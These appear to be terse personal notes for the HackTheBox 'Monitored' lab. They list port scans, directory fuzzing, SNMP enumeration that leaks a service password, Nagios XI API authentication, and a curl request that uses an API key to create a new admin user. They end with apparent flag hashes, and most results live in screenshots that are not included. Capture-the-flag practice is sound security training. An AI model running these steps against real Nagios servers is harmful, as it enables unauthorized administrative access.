https://medium.com/@aniketdas07770/hackthebox-monitored-writeup-485b086b1262

https://techyrick.com/monitored-htb/

nmap -p- --min-rate 100000 10.10.11.248

![[Monitored image.png]]

nmap -p22,80,443,5667 -sC -sV -A 10.10.11.248

![[Monitored image 1.png]]

rustscan -r 1-65535 -a 10.10.11.248 -- -sV -Pn -A

![[Monitored image 2.png]]

feroxbuster --url https://nagios.monitored.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 60 -C 400,500 -k

![[Monitored image 3.png]]

![[Monitored image 4.png]]

https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1

![[Monitored image 5.png]]

![[Monitored image 6.png]]

includes

v1

wfuzz -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 60 --hw 0 --hc 404 "https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ"

![[Monitored image 7.png]]

nmap -sU 10.10.11.248 -p- --min-rate 10000

![[Monitored image 8.png]]

nmap -sU 10.10.11.248 -p161 -A

![[Monitored image 9.png]]

snmpwalk -v 1 -c public -O a 10.10.11.248 >> snmpwalk.txt

cat snmpwalk.txt | grep host

![[Monitored image 10.png]]

ID:svc

PW:XjH7VCehowpR1xZB

curl -X POST -k -L -d 'username=svc&password=XjH7VCehowpR1xZB' https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/

![[Monitored image 11.png]]

{"username":"svc","user_id":"2","auth_token":"93354567c94a1709f35b066e49a83989ba25c322","valid_min":5,"valid_until":"Fri, 19 Apr 2024 16:45:18 -0400"}

※Breaking down the curl command:

- -X is used to specify the HTTP method as POST.
- -k is used to perform the operation insecurely, avoiding SSL certificate-related issues.
- -L is used to follow redirects.
- -d is used to send data in the request body, in this case, the username and password.

![[Monitored image 12.png]]

curl -k -L -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=5a73&password=5a73&name=5a73&email=5a73@monitored.htb&auth_level=admin"

![[Monitored image 13.png]]

![[Monitored image 14.png]]

![[Monitored image 15.png]]

![[Monitored image 16.png]]

![[Monitored image 17.png]]

![[Monitored image 18.png]]

![[Monitored image 19.png]]

cac977bb39ad42bf1e4aa969b1023f9f

![[Monitored image 20.png]]

![[Monitored image 21.png]]

![[Monitored image 22.png]]

![[Monitored image 23.png]]

![[Monitored image 24.png]]

![[Monitored image 25.png]]

![[Monitored image 26.png]]

b7e1e323a75f41f2a593262ff6c74e13